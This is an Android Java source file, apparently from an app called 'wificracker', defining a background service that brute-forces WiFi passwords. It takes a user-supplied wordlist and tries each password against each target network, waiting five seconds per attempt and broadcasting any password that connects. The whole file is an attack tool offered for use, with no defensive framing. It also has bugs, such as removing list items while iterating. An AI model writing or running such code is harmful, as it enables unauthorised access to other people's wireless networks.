package com.wificracker.app.service;

import android.app.Service;
import android.content.Intent;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.IBinder;
import androidx.annotation.Nullable;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import com.wificracker.app.WiFiNetwork;

public class PasswordCrackerService extends Service {
    private WifiManager wifiManager;
    private List<WiFiNetwork> networks;
    private String passwordFile;
    private boolean isRunning = false;

    @Override
    public void onCreate() {
        super.onCreate();
        wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            networks = intent.getParcelableArrayListExtra("networks");
            passwordFile = intent.getStringExtra("passwordFile");
            
            if (networks != null && !networks.isEmpty() && passwordFile != null) {
                startCracking();
            }
        }
        return START_NOT_STICKY;
    }

    private void startCracking() {
        isRunning = true;
        new Thread(() -> {
            try {
                InputStream inputStream = getContentResolver().openInputStream(android.net.Uri.parse(passwordFile));
                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                String password;

                while (isRunning && (password = reader.readLine()) != null) {
                    for (WiFiNetwork network : networks) {
                        if (tryConnect(network, password)) {
                            // Password found
                            Intent broadcastIntent = new Intent("PASSWORD_FOUND");
                            broadcastIntent.putExtra("ssid", network.getSsid());
                            broadcastIntent.putExtra("password", password);
                            sendBroadcast(broadcastIntent);
                            networks.remove(network);
                        }
                    }
                }
                reader.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
            stopSelf();
        }).start();
    }

    private boolean tryConnect(WiFiNetwork network, String password) {
        WifiConfiguration config = new WifiConfiguration();
        config.SSID = "\"" + network.getSsid() + "\"";
        config.preSharedKey = "\"" + password + "\"";
        
        int netId = wifiManager.addNetwork(config);
        wifiManager.disconnect();
        wifiManager.enableNetwork(netId, true);
        wifiManager.reconnect();

        // Wait for connection attempt
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        return wifiManager.getConnectionInfo().getSSID().equals("\"" + network.getSsid() + "\"");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
} 